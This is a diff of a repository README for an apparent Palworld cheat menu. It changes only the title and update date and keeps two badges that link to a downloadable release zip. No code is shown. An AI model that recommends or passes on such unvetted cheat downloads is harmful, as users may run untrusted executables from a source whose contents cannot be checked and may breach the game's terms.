@@ -1,4 +1,4 @@
-# Palworld Cheat Menu (Upd: 28.08.26)
+# Palworld v1 Cheat Menu (Upd: 03.09.26)
 
 [![Download Latest](https://img.shields.io/badge/Download-Latest-brightgreen?style=for-the-badge&logo=github)](https://github.com/Clipaevalley/palworld-mod-hack/releases/download/v1/Palworld_build-1.1.0.zip)
 [![GitHub release](https://img.shields.io/badge/Release-v1.1-blue?style=for-the-badge)](https://github.com/Clipaevalley/palworld-mod-hack/releases/download/v1/Palworld_build-1.1.0.zip)
